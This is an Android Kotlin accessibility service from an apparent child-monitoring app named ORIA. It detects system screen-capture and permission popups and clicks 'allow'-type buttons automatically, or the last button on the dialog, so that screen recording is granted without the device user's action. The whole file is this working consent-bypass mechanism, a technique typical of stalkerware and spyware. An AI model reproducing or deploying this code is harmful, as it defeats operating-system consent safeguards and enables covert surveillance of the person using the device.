package com.oria.child

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class AutoClickService : AccessibilityService() {

    companion object {
        private const val TAG = "ORIA_Robot"
        // ✅ Liste élargie de mots-clés (FR + EN + variantes)
        private val ALLOW_KEYWORDS = listOf(
            "commencer", "autoriser", "accepter", "démarrer", "enregistrer",
            "capturer", "partager", "continuer", "ok", "oui",
            "allow", "start", "begin", "record", "capture", "share", "continue"
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val className = event.className?.toString() ?: ""
                val packageName = event.packageName?.toString() ?: ""

                // Détecter popup MediaProjection / SystemUI
                if (className.contains("MediaProjection") ||
                    className.contains("Screenshot") ||
                    className.contains("ScreenCapture") ||
                    className.contains("SystemUI") ||
                    className.contains("AlertDialog") ||
                    packageName.contains("com.android.systemui")) {

                    Log.d(TAG, "🤖 Popup détectée: $className")
                    rootInActiveWindow?.let { node ->
                        // Essayer d'abord par texte
                        if (!findAndClickByKeyword(node)) {
                            // Fallback: cliquer sur le bouton droit du bas (position standard "Autoriser")
                            findAndClickByPosition(node)
                        }
                    }
                }
            }
        }
    }

    private fun findAndClickByKeyword(node: AccessibilityNodeInfo): Boolean {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val text = child.text?.toString()?.lowercase() ?: ""
            val desc = child.contentDescription?.toString()?.lowercase() ?: ""

            if (child.isClickable && ALLOW_KEYWORDS.any { text.contains(it) || desc.contains(it) }) {
                Log.d(TAG, "✅ Clic par mot-clé: '$text'")
                child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                child.recycle()
                return true
            }
            if (findAndClickByKeyword(child)) return true
            child.recycle()
        }
        return false
    }

    // ✅ Fallback: chercher tous les boutons cliquables et prendre le dernier (généralement "Autoriser")
    private fun findAndClickByPosition(node: AccessibilityNodeInfo) {
        val buttons = mutableListOf<AccessibilityNodeInfo>()
        collectClickableButtons(node, buttons)

        if (buttons.isNotEmpty()) {
            // Le bouton "Autoriser" est généralement le dernier bouton positif
            val target = buttons.last()
            Log.d(TAG, "✅ Clic par position: '${target.text}' (bouton ${buttons.size}/${buttons.size})")
            target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            buttons.forEach { it.recycle() }
        }
    }

    private fun collectClickableButtons(node: AccessibilityNodeInfo, list: MutableList<AccessibilityNodeInfo>) {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (child.isClickable && (child.className?.toString()?.contains("Button") == true ||
                        child.className?.toString()?.contains("button") == true)) {
                list.add(child)
            } else {
                collectClickableButtons(child, list)
                child.recycle()
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "⚠️ Robot interrompu")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "🤖 Robot ORIA activé - Surveillance étendue")
    }
}